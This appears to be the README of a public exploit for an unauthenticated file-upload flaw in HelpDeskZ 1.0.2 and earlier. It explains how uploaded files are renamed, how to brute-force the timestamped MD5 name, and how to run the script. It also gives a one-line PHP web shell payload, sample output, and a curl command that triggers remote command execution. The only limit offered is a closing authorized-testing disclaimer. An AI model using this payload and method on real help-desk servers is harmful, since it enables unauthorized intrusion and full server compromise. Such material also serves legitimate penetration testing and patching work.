# HelpDeskZ File Upload RCE 



An unauthenticated arbitrary file upload in **HelpDeskZ <= 1.0.2** that leads to
remote code execution.

When you attach a file to a support ticket, HelpDeskZ checks the extension only
to decide whether to *display* a warning — it still moves the file into the web
root under `uploads/tickets/`. The uploaded file is renamed to:

```
md5(original_filename + upload_unix_time) . original_extension
```

The extension is preserved, so a `.php` upload stays executable. The only thing
we don't know is the exact second the server handled our request, so after
uploading we just walk backwards from "now", rebuild that MD5 for each second,
and request the URL until one returns `200`.

----------

## Usage

```bash
python3 exploit.py <helpdeskz_url> <payload>
```

Point the URL at the HelpDeskZ install (the directory that serves
`?v=submit_ticket`), for example:

```bash
python3 exploit.py http://target/support shell.php
```

A minimal PHP payload:

```php
<?php system($_GET['cmd']); ?>
```

## Walkthrough

The submit-ticket form is protected by an image CAPTCHA, so the script pauses
and asks you to read it:

```
$ python3 exploit.py http://target/support shell.php
[*] CAPTCHA saved -> /path/to/captcha.png
[?] Type the CAPTCHA: NI7F6
[+] Ticket sent -- the file is on disk regardless of the extension warning.
[*] Looking for the upload in the last 1000s...
[+] Uploaded here: http://target/support/uploads/tickets/fbb69f9c54ae4046f8e0d1cbd8247330.php
    Try: curl 'http://target/support/uploads/tickets/fbb69f9c54ae4046f8e0d1cbd8247330.php?cmd=id'
```

Open `captcha.png`, type the 5–6 characters, and it does the rest. Then trigger
your shell:

```bash
curl 'http://target/support/uploads/tickets/<hash>.php?cmd=id'
```

## Notes

- **Clock skew.** The timestamp brute force assumes your machine's clock is
  close to the server's. If nothing is found, either bump `--window` or sync to
  the target (`sudo ntpdate <host>`).
- **CAPTCHA.** Each request generates a fresh CAPTCHA, so if you mistype it just
  run the script again.
- The uploads directory usually has listing disabled, but the files themselves
  are readable — that's all we need.

## Disclaimer

For authorized security testing and educational use only. Only run this against
systems you own or have explicit written permission to test.
